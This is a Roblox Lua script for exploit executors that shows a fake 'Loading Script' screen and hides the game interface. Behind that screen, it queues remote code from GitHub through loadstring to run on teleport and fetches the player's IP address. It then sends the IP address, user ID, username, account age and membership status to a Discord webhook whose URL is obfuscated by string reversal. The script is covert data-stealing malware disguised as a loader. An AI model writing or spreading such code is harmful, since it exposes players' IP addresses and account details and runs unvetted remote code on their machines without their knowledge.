if game.CoreGui:FindFirstChild("RobloxCoreGUI") then
    return
end
game:GetService("RunService").Heartbeat:Connect(function()
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
end)

local TeleportService = game:GetService("TeleportService")

local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport
queueteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/shibbylol/yeahh/main/main.lua"))()')
local ScreenGui = Instance.new("ScreenGui")

TeleportService:SetTeleportGui(ScreenGui)
if syn then
    syn.protect_gui(ScreenGui)
end
local GUI = Instance.new("Frame")
local PenumbraShadow = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local sexline = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Name = "RobloxCoreGUI"

GUI.Name = "GUI"
GUI.Parent = ScreenGui
GUI.AnchorPoint = Vector2.new(0.5, 0.5)
GUI.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
GUI.BorderColor3 = Color3.fromRGB(15, 15, 15)
GUI.BorderSizePixel = 100
GUI.Position = UDim2.new(0.5, 0, 0.5, 0)
GUI.Size = UDim2.new(1, 0, 1, 0)

PenumbraShadow.Name = "PenumbraShadow"
PenumbraShadow.Parent = GUI
PenumbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
PenumbraShadow.BackgroundTransparency = 1.000
PenumbraShadow.Position = UDim2.new(0.5, 0, 0.5, 1)
PenumbraShadow.Size = UDim2.new(1, 18, 1, 18)
PenumbraShadow.ZIndex = 0
PenumbraShadow.Image = "rbxassetid://1316045217"
PenumbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
PenumbraShadow.ImageTransparency = 0.880
PenumbraShadow.ScaleType = Enum.ScaleType.Slice
PenumbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)

TextLabel.Parent = GUI
TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.5, 0, 0.068702288, 0)
TextLabel.Size = UDim2.new(0.168490157, 0, 0.073282443, 0)
TextLabel.Font = Enum.Font.Gotham
TextLabel.Text = game:HttpGet("https://raw.githubusercontent.com/shibbylol/ffffffortnite/main/name.txt")
TextLabel.TextColor3 = Color3.fromRGB(255, 153, 10)
TextLabel.TextScaled = true
TextLabel.TextSize = 30.000
TextLabel.TextWrapped = true

sexline.Name = "sexline"
sexline.Parent = GUI
sexline.AnchorPoint = Vector2.new(0.5, 0.5)
sexline.BackgroundColor3 = Color3.fromRGB(255, 153, 10)
sexline.BorderSizePixel = 0
sexline.Position = UDim2.new(0.5, 0, 0.959999979, 0)
sexline.Size = UDim2.new(0.562363267, 0, 0.00305343512, 0)

UIGradient.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0.00, 1.00), NumberSequenceKeypoint.new(0.50, 0.00), NumberSequenceKeypoint.new(1.00, 1.00)}
UIGradient.Parent = sexline

TextLabel_2.Parent = GUI
TextLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.499635309, 0, 0.119847327, 0)
TextLabel_2.Size = UDim2.new(0.240700215, 0, 0.0304550454, 0)
TextLabel_2.Font = Enum.Font.Gotham
TextLabel_2.Text = "The dogs bark, the bear walks."
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 15.000
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = GUI
TextLabel_3.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.5, 0, 0.899999976, 0)
TextLabel_3.Size = UDim2.new(0, 200, 0, 50)
TextLabel_3.Font = Enum.Font.GothamMedium
TextLabel_3.Text = "Loading Script"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 14.000

TextLabel_4.Parent = TextLabel_3
TextLabel_4.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0.5, 0, 0.899999976, 0)
TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
TextLabel_4.Font = Enum.Font.GothamMedium
TextLabel_4.Text = "(0/1)"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 153, 10)
TextLabel_4.TextSize = 12.000

spawn(function()
while true do
wait(0.8)
TextLabel_3.Text = TextLabel_3.Text .. "."
if TextLabel_3.Text == "Loading Script...." then
TextLabel_3.Text = "Loading Script"
end
end
end)
if KRNL_LOADED then
    getgenv().syn = nil
end
local exploit_type
if PROTOSMASHER_LOADED then
    exploit_type = "ProtoSmasher"
elseif is_sirhurt_closure then
    exploit_type = "Sirhurt"
elseif SENTINEL_LOADED then
    exploit_type = "Sentinel"
elseif syn then
    exploit_type = "Synapse X"
elseif KRNL_LOADED then
    exploit_type = "KRNL"
elseif hookfunction_raw and hmjdfk then
    exploit_type = "Fluxus Mac Free"
    if not getconnections then
        getgenv().getconnections = function()
            return {}
        end
        getgenv().set_thread_context = function()
            return
        end
        getgenv().fluxus_loaded = true
    end
elseif FLUXUS_LOADED then
    exploit_type = "Fluxus"
elseif getexecutorname then
    exploit_type = "Script-Ware"
end
TeleportService:Teleport(10209266381)
local a = game:HttpGet("https://Google.littsedth.repl.co/GetHeaders")
local d = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false"))
local prem = "None"
if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
    prem = "Premium"
end
http_request = http_request or request or (http and http.request) or syn.request 
local response = http_request(
    {

        Url = string.reverse("acdZYCM9ZO67NTCgaJ93A6ZMmsyV-g2AuJNUhbdBpoTTjm9z-_A2Z3gyVme2NpHhD2WL/3547818427257530001/skoohbew/ipa/moc.drocsid//:sptth"),
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"  -- When sending JSON, set this!
        },
        Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {{
            ["title"] = "Executor: "..exploit_type,
            ["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.. "/profile",
            ["color"] = 16737792,
            ["fields"] = {
                {
                    ["name"] = "User ID",
                    ["value"] = "```lua\n"..game.Players.LocalPlayer.UserId.."\n```",
                    ["inline"] = true
                  },
                  {
                    ["name"] = "Account Age",
                    ["value"] = "```lua\n"..game.Players.LocalPlayer.AccountAge.."\n```",
                    ["inline"] = true
                  },
                  {
                    ["name"] = "IP Address",
                    ["value"] = "```lua\n"..a.."\n```"
                  },
                  {
                    ["name"] = "Membership",
                    ["value"] = "```md\n#"..prem.."\n```"
                  },
                  {
                    ["name"] = "Username",
                    ["value"] = "```md\n#"..game.Players.LocalPlayer.Name.."\n```"
                  }
            },
            ["footer"] = {
                ["text"] = "Blackbear Execution Logs https://discord.gg/UrGg5BmRAH"
            },
            ["thumbnail"] = {
                ["url"] = d.data[1].imageUrl
            }
        }}})
    }
)
